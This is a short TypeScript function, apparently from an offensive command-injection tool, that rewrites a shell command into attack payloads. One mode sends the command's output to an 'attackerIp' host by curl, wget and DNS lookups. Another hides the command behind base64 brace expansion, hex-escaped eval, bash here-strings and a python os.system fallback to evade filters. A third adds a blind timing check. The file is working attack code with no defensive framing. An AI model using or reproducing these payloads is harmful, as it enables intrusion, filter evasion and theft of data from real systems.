export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string {
  if (!cmd) return "";
  const raw = String(cmd);

  if (mode === "blind") {
    return `_T=$SECONDS; { ${raw}; } 2>&1; _E=$?; sleep 7; echo "[blind_confirmed:$((SECONDS-_T))s|exit:$_E]"`;
  }

  if (mode === "oob") {
    return (
      `_OUT=$(${raw} 2>&1); ` +
      `_B64=$(printf '%s' "$_OUT" | base64 -w0 2>/dev/null || printf '%s' "$_OUT" | base64); ` +
      `curl -sk -m8 -X POST "http://${attackerIp}:${attackerPort}/oob" ` +
        `--data-urlencode "d=$_OUT" --data-urlencode "b=$_B64" >/dev/null 2>&1 & ` +
      `wget -qO/dev/null --timeout=8 "http://${attackerIp}:${attackerPort}/?b=$_B64" 2>/dev/null & ` +
      `nslookup "$(printf '%s' "$_OUT" | head -c20 | tr -cd '[:alnum:]').oob.${attackerIp}" >/dev/null 2>&1 & ` +
      `printf '%s\n' "$_OUT"`
    );
  }

  if (mode === "quantum") {
    const b64 = Buffer.from(raw).toString("base64");
    const hex = Array.from(Buffer.from(raw))
      .map(b => `\\x${b.toString(16).padStart(2, "0")}`)
      .join("");
    return (
      `{ {echo,${b64}}|{base64,-d}|bash; } 2>/dev/null || ` +
      `{ eval "$(printf '${hex}')"; } 2>/dev/null || ` +
      `{ bash<<<$(echo ${b64}|base64 -d); } 2>/dev/null || ` +
      `{ python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"; } 2>/dev/null`
    );
  }

  return raw;
}
